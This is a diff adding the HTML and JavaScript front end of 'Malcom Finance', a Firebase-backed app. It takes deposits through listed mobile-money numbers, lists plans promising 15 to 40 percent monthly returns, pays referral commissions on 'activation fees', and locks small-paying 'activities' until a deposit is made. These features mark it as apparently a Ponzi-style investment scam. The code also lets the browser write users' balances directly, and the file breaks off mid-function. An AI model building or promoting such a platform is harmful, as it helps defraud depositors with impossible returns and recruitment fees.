@@ -1,0 +1,1668 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css">
+    <title>Malcom Finance</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+    <!-- Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage-compat.js"></script>
+    
+    <style>
+        * {
+            font-family: system-ui, -apple-system, sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background-image: url('bg.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-blur: 1px;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('bg.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            filter: blur(1px);
+            z-index: -1;
+        }
+        
+        body {
+            position: relative;
+            z-index: 1;
+            background-color: rgba(0, 0, 0, 0.3);
+        }
+        
+        .logo {
+            height: 3em;
+            width: auto;
+        }
+        
+        #header {
+            width: 98%;
+            background: black;
+            position: fixed;
+            top: 2px;
+            padding: 3px;
+            left: 2px;
+            border-radius: 5px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        #header .fa-bars {
+            color: white;
+            font-size: 2.5em;
+            padding: 5px;
+            cursor: pointer;
+        }
+        
+        main {
+            margin-top: 5em;
+            text-align: center;
+            padding-bottom: 80px;
+        }
+        
+        h2 {
+            text-align: center;
+            font-weight: 200;
+            color: white;
+        }
+        
+        buttons {
+            width: 85%;
+            display: flex;
+            justify-content: space-between;
+            margin: 20px auto;
+        }
+        
+        buttons button {
+            width: 47%;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 1em;
+            text-transform: uppercase;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        buttons .black {
+            background: white;
+            color: black;
+            border: 3px solid white;
+        }
+        
+        buttons .white {
+            background: transparent;
+            color: white;
+            border: 3px solid white;
+        }
+        
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
+        
+        .loaderimg {
+            width: 12em;
+        }
+        
+        .lbt {
+            background: transparent;
+            color: white;
+            
+            width: 3.5em;
+            height: 3.5em;
+            border: none;
+            cursor: pointer;
+            font-size: 0.8em;
+        }
+        
+        links {
+            background: black;
+            position: fixed;
+            bottom: 1px;
+            width: 98%;
+            border-radius: 5px;
+            left: 2px;
+            padding: 10px 0;
+            gap: 10px;
+            text-align: center;
+            display: flex;
+            justify-content: space-around;
+            z-index: 1000;
+        }
+        
+        .nav-container {
+            position: fixed;
+            top: 4em;
+            right: -300px;
+            width: 290px;
+            min-height: 70%;
+            background-color: black;
+            z-index: 1000;
+            transition: right 0.3s ease;
+            box-shadow: -5px 0 15px rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+        }
+        
+        .nav-container.open {
+            right: 3px;
+        }
+        
+        .nav-links {
+            padding: 20px 0;
+        }
+        
+        .nav-links a {
+            display: block;
+            padding: 15px 20px;
+            color: white;
+            text-decoration: none;
+            transition: background-color 0.3s;
+            border-left: 4px solid transparent;
+            transition: border-left 0.4s;
+            cursor: pointer;
+        }
+        
+        .nav-links a:hover {
+            background-color: #333;
+            border-left: 4px solid #6ab8ff;
+        }
+        
+        .nav-links i {
+            margin-right: 10px;
+            width: 20px;
+            text-align: center;
+        }
+        
+        #balance, #profile, #timetable, .hdgg, .transaction, .card {
+            width: 100%;
+            color: white;
+            background: #00000090;
+            padding: 30px 20px;
+            border-radius: 10px;
+            margin: 10px auto;
+        }
+        
+        .page {
+            text-align: center;
+            align-items: center;
+            justify-content: center;
+            width: 95%;
+            padding: 7px;
+            display: none;
+        }
+        
+        .page.active {
+            display: block;
+        }
+        
+        label[for="accbal"] {
+            font-weight: 900;
+        }
+        
+        .pp {
+            width: 10em;
+            height: 10em;
+            border-radius: 50%;
+            border: 3px solid #ffffea56;
+            object-fit: cover;
+        }
+        
+        #username {
+            color: White;
+            font-size: 1.5em;
+            margin-top: 10px;
+            display: block;
+        }
+        
+        #accbal {
+            color: #6ab8ff;
+            font-size: 1.8em;
+            font-weight: bold;
+        }
+        
+        #progs, #progs tr, #progs td, #progs th {
+            border: 1px solid white;
+        }
+        
+        #progs {
+            width: 100%;
+            text-align: left;
+            border-collapse: collapse;
+            margin-top: 15px;
+        }
+        
+        #progs i {
+            padding: 5px;
+        }
+        
+        #progs td, #progs th {
+            padding: 10px;
+        }
+        
+        #progs th {
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        #progs tr:hover {
+            background: rgba(255, 255, 255, 0.05);
+            cursor: pointer;
+        }
+        
+        .transaction {
+            text-align: left;
+            margin: 15px auto;
+        }
+        
+        .transaction label {
+            font-weight: 900;
+            padding-left: 5px;
+            color: #ccc;
+        }
+        
+        .transaction span {
+            color: white;
+        }
+        
+        .transaction table {
+            width: 100%;
+        }
+        
+        .transaction tr {
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .transaction td {
+            padding: 8px 5px;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background: #000;
+            padding: 30px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 500px;
+            border: 1px solid #333;
+        }
+        
+        .modal h3 {
+            color: white;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .modal-input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #333;
+            background: #111;
+            color: white;
+            font-size: 16px;
+        }
+        
+        .modal-btn {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: none;
+            background: #6ab8ff;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .modal-btn.secondary {
+            background: #333;
+        }
+        
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            color: white;
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        
+        .activity-completed {
+            background: rgba(106, 184, 255, 0.1) !important;
+            color: #6ab8ff !important;
+        }
+        
+        .notification {
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid rgba(255, 193, 7, 0.3);
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px auto;
+            color: #ffc107;
+        }
+        
+        .withdraw-form {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px auto;
+            width: 90%;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        
+        .form-group label {
+            color: white;
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px;
+            border-radius: 5px;
+            border: 1px solid #333;
+            background: #111;
+            color: white;
+            font-size: 16px;
+        }
+        
+        .status-badge {
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-size: 12px;
+            font-weight: bold;
+            display: inline-block;
+        }
+        
+        .status-pending {
+            background: rgba(255, 193, 7, 0.2);
+            color: #ffc107;
+        }
+        
+        .status-completed {
+            background: rgba(40, 167, 69, 0.2);
+            color: #28a745;
+        }
+        
+        .status-rejected {
+            background: rgba(220, 53, 69, 0.2);
+            color: #dc3545;
+        }
+        
+        #txn-list {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .offer-card {
+            background: #00000090;
+            border: 1px solid rgba(106, 184, 255, 0.3);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px auto;
+            text-align: left;
+        }
+        
+        .offer-card h4 {
+            color: #6ab8ff;
+            margin-bottom: 10px;
+        }
+        
+        .offer-card p {
+            color: #ccc;
+            margin-bottom: 15px;
+            font-weight: 900;
+        }
+        
+        .invest-plan {
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px auto;
+        }
+        
+        .invest-plan h4 {
+            color: #6ab8ff;
+            margin-bottom: 10px;
+        }
+        
+        .invest-plan p {
+            color: #ccc;
+            margin: 5px 0;
+        }
+        
+        #activities-list {
+            max-height: 500px;
+            overflow-y: auto;
+        }
+        
+        .activity-item {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px auto;
+            text-align: left;
+        }
+        
+        .login-modal {
+            background: rgba(0, 0, 0, 0.95);
+        }
+        
+        .login-tabs {
+            display: flex;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #333;
+        }
+        
+        .tab-btn {
+            flex: 1;
+            padding: 15px;
+            background: none;
+            border: none;
+            color: #ccc;
+            font-size: 16px;
+            cursor: pointer;
+            border-bottom: 3px solid transparent;
+        }
+        
+        .tab-btn.active {
+            color: #6ab8ff;
+            border-bottom-color: #6ab8ff;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        #login-error, #register-error {
+            color: #dc3545;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        #login-success {
+            color: #28a745;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .loader {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #ffffff4e;
+            border-top: 4px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .copy-btn {
+            background: #6ab8ff;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-left: 10px;
+            font-size: 12px;
+        }
+        
+        #referral-link {
+            background: #111;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            word-break: break-all;
+            color: #6ab8ff;
+        }
+        
+        .profile-info {
+            text-align: left;
+            margin-top: 20px;
+            background: #00000090;
+            padding: 15px;
+            border-radius: 10px;
+        }
+        
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .info-label {
+            color: #ccc;
+        }
+        
+        .info-value {
+            color: white;
+            font-weight: bold;
+        }
+        
+        @media (max-width: 768px) {
+            body {
+                background-attachment: scroll;
+            }
+            
+            buttons {
+                flex-direction: column;
+            }
+            
+            buttons button {
+                width: 100%;
+                margin-bottom: 10px;
+            }
+            
+            .nav-container {
+                width: 85%;
+            }
+        }
+        
+        #user-email {
+            color: #aaa;
+            font-size: 0.9em;
+            display: block;
+            margin-top: 5px;
+        }
+        
+        #currency {
+            color: #aaa;
+            font-size: 1em;
+            margin-left: 5px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div id="loading-screen">
+        <img src="logo.png" class="loaderimg">
+        <div class="loader"></div>
+        <p style="color: white; margin-top: 20px;">Loading Malcom Finance...</p>
+    </div>
+    
+    <!-- Header -->
+    <div id="header">
+        <img src="logo.png" class="logo">
+        <i class="fas fa-bars fa-fade" onclick="openNav()"></i>
+    </div>
+    
+    <!-- Navigation Menu -->
+    <div class="nav-container" id="nav-menu">
+        <div class="nav-links">
+            <a onclick="showPage('home')"><i class="fas fa-home"></i> Home</a>
+            <a onclick="showPage('activity')"><i class="fas fa-bank"></i> My Activity</a>
+            <a onclick="showPage('earnings')"><i class="fas fa-coins"></i> Earnings</a>
+            <a onclick="showPage('invests')"><i class="fas fa-baby"></i> My Investments</a>
+            <a onclick="showReferralModal()"><i class="fas fa-share-alt"></i> Refer & Earn</a>
+            <a onclick="showPage('offers')"><i class="fas fa-gift"></i> Offers</a>
+            <a onclick="showPage('account')"><i class="fas fa-users"></i> My Account</a>
+            <a href="contact.html"><i class="fas fa-envelope"></i> Contact</a>
+            <a onclick="logout()" style="color: #ff6b6b;"><i class="fas fa-sign-out-alt"></i> Logout</a>
+        </div>
+    </div>
+    
+    <!-- Main Content -->
+    <main>
+        <!-- Home Page -->
+        <div class="page active" id="home">
+            <div id="profile">
+                <img src="ol3.png" alt="Profile Picture" class="pp">
+                <br>
+                <b id="username">Guest User</b>
+                <span id="user-email"></span>
+            </div>
+            
+            <div id="balance">
+                <label for="accbal">Account Balance:</label> 
+                <span id="accbal">0.00</span><span id="currency">USD</span>
+                <div style="margin-top: 15px;">
+                    <buttons>
+                        <button class="black" onclick="showDepositModal()">Deposit</button>
+                        <button class="white" onclick="showWithdrawModal()">Withdraw</button>
+                    </buttons>
+                </div>
+            </div>
+            
+            <div id="timetable">
+                <b>Weekly Program</b>
+                <table id="progs">
+                    <tr>
+                        <th>Day</th>
+                        <th>Activity</th>
+                        <th>Earnings</th>
+                    </tr>
+                    <!-- Activities will be populated -->
+                </table>
+            </div>
+            
+            <div id="notifications">
+                <!-- Notifications will appear here -->
+            </div>
+        </div>
+        
+        <!-- Activity Page -->
+        <div class="page" id="activity">
+            <div class="hdgg">My Completed Activities</div>
+            <div id="activities-list">
+                <!-- Activities will be loaded here -->
+            </div>
+        </div>
+        
+        <!-- Earnings Page -->
+        <div class="page" id="earnings">
+            <div class="hdgg">Earnings Report</div>
+            <div class="card">
+                <h3>Total Earnings: $<span id="total-earnings">0.00</span></h3>
+                <p>This Week: $<span id="week-earnings">0.00</span></p>
+                <p>Today: $<span id="today-earnings">0.00</span></p>
+            </div>
+        </div>
+        
+        <!-- Transactions Page -->
+        <div class="page" id="transactions">
+            <div class="hdgg">Transaction History</div>
+            <div id="txn-list">
+                <!-- Transactions will be loaded here -->
+            </div>
+        </div>
+        
+        <!-- Investments Page -->
+        <div class="page" id="invests">
+            <div class="hdgg">Investment Plans</div>
+            <div class="invest-plan">
+                <h4>Starter Plan</h4>
+                <p>Min: $50</p>
+                <p>Returns: 15% monthly</p>
+                <button class="black" onclick="invest('starter')" style="width: 100%; margin-top: 10px;">Invest Now</button>
+            </div>
+            <div class="invest-plan">
+                <h4>Premium Plan</h4>
+                <p>Min: $200</p>
+                <p>Returns: 25% monthly</p>
+                <button class="black" onclick="invest('premium')" style="width: 100%; margin-top: 10px;">Invest Now</button>
+            </div>
+            <div class="invest-plan">
+                <h4>VIP Plan</h4>
+                <p>Min: $500</p>
+                <p>Returns: 40% monthly</p>
+                <button class="black" onclick="invest('vip')" style="width: 100%; margin-top: 10px;">Invest Now</button>
+            </div>
+        </div>
+<style>
+    .black{
+        background: black;
+        color: white;
+        padding: 10px;
+        border-radius: 5px;
+        border: none;
+        font-weight: 900;
+    }
+    .invest-plan p{
+        text-align: left;
+        font-weight: 600;
+    }
+    .tvty{
+        width: 30em;
+    }
+    .tvty i{
+        margin-right: 10px;
+      
+    }
+</style>        
+        <!-- Offers Page -->
+        <div class="page" id="offers">
+            <div class="hdgg">Special Offers</div>
+            <div id="offers-list">
+                <!-- Offers will be loaded here -->
+            </div>
+        </div>
+        
+        <!-- Account Page -->
+        <div class="page" id="account">
+            <div class="hdgg">Account</div>
+            <div class="profile-info">
+                <div class="info-row">
+                    <span class="info-label">Account Status:</span>
+                    <span class="info-value" id="account-status">Inactive</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Referral Code:</span>
+                    <span class="info-value" id="user-referral">N/A</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Total Referrals:</span>
+                    <span class="info-value" id="total-referrals">0</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Member Since:</span>
+                    <span class="info-value" id="join-date">N/A</span>
+                </div>
+            </div>
+            <buttons style="margin-top: 30px;">
+                <button class="white" onclick="logout()">Logout</button>
+                <button class="black" onclick="showReferralModal()">Refer Friends</button>
+            </buttons>
+        </div>
+    </main>
+    
+    <!-- Footer Navigation -->
+    <footer>
+        <links>
+            <button class="lbt" onclick="showPage('home')">
+                <i class="fas fa-home"></i>
+            </button>
+            <button class="lbt" onclick="showPage('activity')">
+                <i class="fas fa-bank"></i>
+            </button>
+            <button class="lbt" onclick="showPage('transactions')">
+                <i class="fas fa-exchange-alt"></i>
+            </button>
+            <button class="lbt" onclick="showPage('offers')">
+                <i class="fas fa-gift"></i>
+            </button>
+            <button class="lbt" onclick="showPage('account')">
+                <i class="fas fa-user"></i>
+            </button>
+        </links>
+    </footer>
+    
+    <!-- Login Modal -->
+    <div id="login-modal" class="modal">
+        <div class="modal-content login-modal">
+            <button class="close-btn" onclick="closeModal('login-modal')">&times;</button>
+            <h3>Welcome to Malcom Finance</h3>
+            
+            <div class="login-tabs">
+                <button class="tab-btn active" onclick="showTab('login')">Login</button>
+                <button class="tab-btn" onclick="showTab('register')">Register</button>
+            </div>
+            
+            <div id="login-tab" class="tab-content active">
+                <div id="login-error"></div>
+                <input type="email" id="login-email" class="modal-input" placeholder="Email Address">
+                <input type="password" id="login-password" class="modal-input" placeholder="Password">
+                <button class="modal-btn" onclick="login()">Login</button>
+            </div>
+            
+            <div id="register-tab" class="tab-content">
+                <div id="register-error"></div>
+                <div id="register-success"></div>
+                <input type="text" id="register-name" class="modal-input" placeholder="Full Name">
+                <input type="email" id="register-email" class="modal-input" placeholder="Email Address">
+                <input type="tel" id="register-phone" class="modal-input" placeholder="Phone Number">
+                <input type="password" id="register-password" class="modal-input" placeholder="Password (min 6 chars)">
+                <input type="text" id="register-referral" class="modal-input" placeholder="Referral Code (Optional)">
+                <button class="modal-btn" onclick="register()">Create Account</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Deposit Modal -->
+    <div id="deposit-modal" class="modal">
+        <div class="modal-content">
+            <button class="close-btn" onclick="closeModal('deposit-modal')">&times;</button>
+            <h3>Deposit Funds</h3>
+            <p style="color: #ccc; margin-bottom: 20px;">Send payment to the details below:</p>
+            
+            <div style="background: rgba(106, 184, 255, 0.1); padding: 15px; border-radius: 8px; margin: 15px 0;">
+                <h4 style="color: #6ab8ff; margin-bottom: 10px;">Payment Details:</h4>
+                <p style="color: white; margin: 5px 0;">KCB bank: xxxxxxxxxx</p>
+                <p style="color: white; margin: 5px 0;">Airtel: +256700559067</p>
+                <p style="color: white; margin: 5px 0;">MTN: +256791728084</p>
+            </div>
+            
+            <div style="margin: 20px 0;">
+                <p style="color: #ffc107;">After payment, send proof to: support.malcomfinance@gmail.com<br>
+Or on WhatsApp, +256700559067</p>
+                <p style="color: #ccc; font-size: 14px; margin-top: 10px;">Include your username and transaction ID</p>
+            </div>
+            
+            <button class="modal-btn secondary" onclick="closeModal('deposit-modal')">Close</button>
+        </div>
+    </div>
+    
+    <!-- Withdraw Modal -->
+    <div id="withdraw-modal" class="modal">
+        <div class="modal-content">
+            <button class="close-btn" onclick="closeModal('withdraw-modal')">&times;</button>
+            <h3>Withdraw Funds</h3>
+            
+            <div class="form-group">
+                <label>Amount (USD)</label>
+                <input type="number" id="withdraw-amount" class="modal-input" placeholder="Minimum: $10" min="10">
+            </div>
+            
+            <div class="form-group">
+                <label>Payment Method</label>
+                <select id="withdraw-method" class="modal-input">
+                    <option value="bitcoin">Bitcoin</option>
+                    <option value="ethereum">Ethereum</option>
+                    <option value="usdt">USDT (TRC20)</option>
+                    <option value="paypal">PayPal</option>
+<option value="mtn">MTN</option>
+<option value="airtel">Airtel</option>
+<option value="GPC">Global Pay Card</option>
+
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label>Wallet Address / Email</label>
+                <input type="text" id="withdraw-wallet" class="modal-input" placeholder="Enter your wallet address or PayPal email">
+            </div>
+            
+            <p style="color: #ffc107; margin: 15px 0; font-size: 14px;">Processing time: 2-5 hours | Fee: 5%</p>
+            
+            <button class="modal-btn" onclick="submitWithdrawal()">Submit Request</button>
+        </div>
+    </div>
+    
+    <!-- Referral Modal -->
+    <div id="referral-modal" class="modal">
+        <div class="modal-content">
+            <button class="close-btn" onclick="closeModal('referral-modal')">&times;</button>
+            <h3>Refer & Earn</h3>
+            
+            <p style="color: #ccc; margin-bottom: 20px;">Share your referral link and earn 50% of your referrals' activation fee!</p>
+            
+            <div style="background: rgba(106, 184, 255, 0.1); padding: 15px; border-radius: 8px; margin: 15px 0;">
+                <h4 style="color: #6ab8ff; margin-bottom: 10px;">Your Referral Link:</h4>
+                <div id="referral-link">Loading...</div>
+                <button class="copy-btn" onclick="copyReferralLink()" style="width: 100%; margin-top: 10px;">Copy Link</button>
+            </div>
+            
+            <div style="margin: 20px 0;">
+                <h4 style="color: #6ab8ff;">How it works:</h4>
+                <p style="color: #ccc; margin: 10px 0;">1. Share your link with friends</p>
+                <p style="color: #ccc; margin: 10px 0;">2. They sign up using your link</p>
+                <p style="color: #ccc; margin: 10px 0;">3. Earn 50% of their activation fee!</p>
+            </div>
+            
+            <button class="modal-btn secondary" onclick="closeModal('referral-modal')">Close</button>
+        </div>
+    </div>
+    
+    <!-- Investment Modal -->
+    <div id="invest-modal" class="modal">
+        <div class="modal-content">
+            <button class="close-btn" onclick="closeModal('invest-modal')">&times;</button>
+            <h3 id="invest-plan-title">Invest Now</h3>
+            
+            <div class="form-group">
+                <label>Investment Amount (USD)</label>
+                <input type="number" id="invest-amount" class="modal-input" placeholder="Enter amount" min="50">
+            </div>
+            
+            <div class="form-group">
+                <label>Payment Method</label>
+                <select id="invest-method" class="modal-input">
+                    <option value="bitcoin">Bitcoin</option>
+                    <option value="ethereum">Ethereum</option>
+                    <option value="usdt">USDT</option>
+                    <option value="balance">Account Balance</option>
+                </select>
+            </div>
+            
+            <div style="background: rgba(40, 167, 69, 0.1); padding: 15px; border-radius: 8px; margin: 15px 0;">
+                <h4 style="color: #28a745;">Investment Details:</h4>
+                <p style="color: #ccc; margin: 5px 0;">Plan: <span id="plan-name">Starter</span></p>
+                <p style="color: #ccc; margin: 5px 0;">Monthly Returns: <span id="plan-returns">15%</span></p>
+                <p style="color: #ccc; margin: 5px 0;">Minimum: $<span id="plan-min">50</span></p>
+            </div>
+            
+            <button class="modal-btn" onclick="submitInvestment()">Confirm Investment</button>
+        </div>
+    </div>
+
+    <!-- Firebase Configuration -->
+    <script>
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAJaFVETxpy8Vr5e6RXDWi3NBhEUaZEPN4",
+            authDomain: "malcolm-finance.firebaseapp.com",
+            projectId: "malcolm-finance",
+            storageBucket: "malcolm-finance.firebasestorage.app",
+            messagingSenderId: "987613399580",
+            appId: "1:987613399580:web:0237b2c8c2c7df54222dd9",
+            measurementId: "G-1CEG3BWFBP"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+        window.auth = auth;
+        window.db = db;
+    </script>
+
+    <!-- Main Application Script -->
+    <script>
+        // Global Variables
+        let currentUser = null;
+        let userData = null;
+        let weeklyActivities = [];
+        let allTransactions = [];
+        let currentPlan = null;
+        
+        // Initialize App
+        document.addEventListener('DOMContentLoaded', function() {
+            // Prevent zooming
+            document.addEventListener('touchstart', function(e) {
+                if (e.touches.length > 1) e.preventDefault();
+            }, { passive: false });
+            
+            document.addEventListener('gesturestart', function(e) { e.preventDefault(); });
+            
+            let lastTouchEnd = 0;
+            document.addEventListener('touchend', function(e) {
+                const now = Date.now();
+                if (now - lastTouchEnd <= 300) e.preventDefault();
+                lastTouchEnd = now;
+            }, false);
+            
+            // Check auth state
+            auth.onAuthStateChanged(async (user) => {
+                if (user) {
+                    currentUser = user;
+                    await loadUserData(user.uid);
+                    updateUI();
+                    loadWeeklyActivities();
+                    loadTransactions();
+                    loadOffers();
+                    document.getElementById('loading-screen').style.display = 'none';
+                } else {
+                    // Show login modal after delay
+                    setTimeout(() => {
+                        document.getElementById('loading-screen').style.display = 'none';
+                        showLoginModal();
+                    }, 1000);
+                }
+            });
+        });
+        
+        // Load user data from Firestore
+        async function loadUserData(userId) {
+            try {
+                const doc = await db.collection('users').doc(userId).get();
+                if (doc.exists) {
+                    userData = doc.data();
+                    userData.id = userId;
+                    
+                    // Update last login
+                    await db.collection('users').doc(userId).update({
+                        lastLogin: new Date().toISOString()
+                    });
+                } else {
+                    console.log("No user data found");
+                }
+            } catch (error) {
+                console.error("Error loading user data:", error);
+            }
+        }
+        
+        // Load weekly activities
+        async function loadWeeklyActivities() {
+            try {
+                // Default activities
+                weeklyActivities = [
+                    { day: "Sunday", activity: "TikTok", earnings: 0.1, icon: "fab fa-tiktok", iconStyle: "color: white;" },
+                    { day: "Monday", activity: "YouTube", earnings: 0.1, icon: "fab fa-youtube", iconStyle: "color: red;" },
+                    { day: "Tuesday", activity: "Memes", earnings: 0.1, icon: "fas fa-smile", iconStyle: "color: yellow;" },
+                    { day: "Wednesday", activity: "Survey", earnings: 0.1, icon: "fas fa-question-circle", iconStyle: "color: yellowgreen;" },
+                    { day: "Thursday", activity: "Blogging", earnings: 0.1, icon: "fas fa-paper-plane", iconStyle: "color: #ffaacb;" },
+                    { day: "Friday", activity: "Chat", earnings: 0.1, icon: "fas fa-globe", iconStyle: "color: #95e2ff;" },
+                    { day: "Saturday", activity: "Trading", earnings: 0.1, icon: "fas fa-dollar-sign", iconStyle: "color: #b0ff15;" }
+                ];
+                
+                // Update table
+                const table = document.getElementById('progs');
+                const tbody = table.getElementsByTagName('tbody')[0];
+                tbody.innerHTML = '';
+                
+                weeklyActivities.forEach((activity, index) => {
+                    const row = tbody.insertRow();
+                    row.innerHTML = `
+                        <td>${activity.day}</td>
+                        <td class="tvty"><i class="${activity.icon}" style="${activity.iconStyle}"></i> ${activity.activity}</td>
+                        <td hidden>$${activity.earnings}</td>
+                    `;
+                    
+                    row.style.cursor = 'pointer';
+                    row.onclick = () => completeActivity(index);
+                });
+            } catch (error) {
+                console.error("Error loading activities:", error);
+            }
+        }
+        
+        // Complete activity
+        async function completeActivity(index) {
+            if (!userData || !userData.isActive) {
+                alert("Please activate your account first by making a deposit.");
+                return;
+            }
+            
+            const activity = weeklyActivities[index];
+            const today = new Date().getDay(); // 0 = Sunday, 1 = Monday, etc.
+            
+            if (today !== index) {
+                alert(`This activity is only available on ${activity.day}s.`);
+                return;
+            }
+            
+            // Check if already completed today
+            const todayStr = new Date().toDateString();
+            const completedKey = `completed_${index}_${todayStr}`;
+            
+            if (localStorage.getItem(completedKey)) {
+                alert("You have already completed this activity today.");
+                return;
+            }
+            
+            if (confirm(`Complete "${activity.activity}" and earn $${activity.earnings}?`)) {
+                try {
+                    // Create transaction
+                    const transaction = {
+                        userId: currentUser.uid,
+                        type: 'earning',
+                        amount: activity.earnings,
+                        description: `Completed: ${activity.activity}`,
+                        date: new Date().toISOString(),
+                        status: 'completed'
+                    };
+                    
+                    await db.collection('transactions').add(transaction);
+                    
+                    // Update user balance
+                    const newBalance = (userData.balance || 0) + activity.earnings;
+                    await db.collection('users').doc(currentUser.uid).update({
+                        balance: newBalance,
+                        totalEarnings: firebase.firestore.FieldValue.increment(activity.earnings)
+                    });
+                    
+                    // Update local data
+                    userData.balance = newBalance;
+                    
+                    // Mark as completed
+                    localStorage.setItem(completedKey, 'true');
+                    
+                    // Update UI
+                    updateUI();
+                    loadTransactions();
+                    
+                    alert(`Activity completed! $${activity.earnings} has been added to your balance.`);
+                    
+                } catch (error) {
+                    console.error("Error completing activity:", error);
+                    alert("Error completing activity. Please try again.");
+                }
+            }
+        }
+        
+        // Load transactions
+        async function loadTransactions() {
+            if (!currentUser) return;
+            
+            try {
+                const snapshot = await db.collection('transactions')
+                    .where('userId', '==', currentUser.uid)
+                    .orderBy('date', 'desc')
+                    .limit(20)
+                    .get();
+                
+                allTransactions = [];
+                snapshot.forEach(doc => {
+                    allTransactions.push({ id: doc.id, ...doc.data() });
+                });
+                
+                updateTransactionsUI();
+            } catch (error) {
+                console.error("Error loading transactions:", error);
+            }
+        }
+        
+        // Update transactions UI
+        function updateTransactionsUI() {
+            const container = document.getElementById('txn-list');
+            if (!container) return;
+            
+            container.innerHTML = '';
+            
+            if (allTransactions.length === 0) {
+                container.innerHTML = '<p style="color: #ccc; text-align: center;">No transactions found.</p>';
+                return;
+            }
+            
+            allTransactions.forEach(txn => {
+                const date = new Date(txn.date).toLocaleString();
+                const txnEl = document.createElement('div');
+                txnEl.className = 'transaction';
+                txnEl.innerHTML = `
+                    <table>
+                        <tr>
+                            <td><label>Type:</label></td>
+                            <td><span>${txn.type}</span></td>
+                        </tr>
+                        <tr>
+                            <td><label>Description:</label></td>
+                            <td><span>${txn.description}</span></td>
+                        </tr>
+                        <tr>
+                            <td><label>Amount:</label></td>
+                            <td><span>$${txn.amount}</span></td>
+                        </tr>
+                        <tr>
+                            <td><label>Date:</label></td>
+                            <td><span>${date}</span></td>
+                        </tr>
+                        <tr>
+                            <td><label>Status:</label></td>
+                            <td><span class="status-badge status-${txn.status}">${txn.status}</span></td>
+                        </tr>
+                    </table>
+                `;
+                container.appendChild(txnEl);
+            });
+        }
+        
+        // Load offers
+        async function loadOffers() {
+            try {
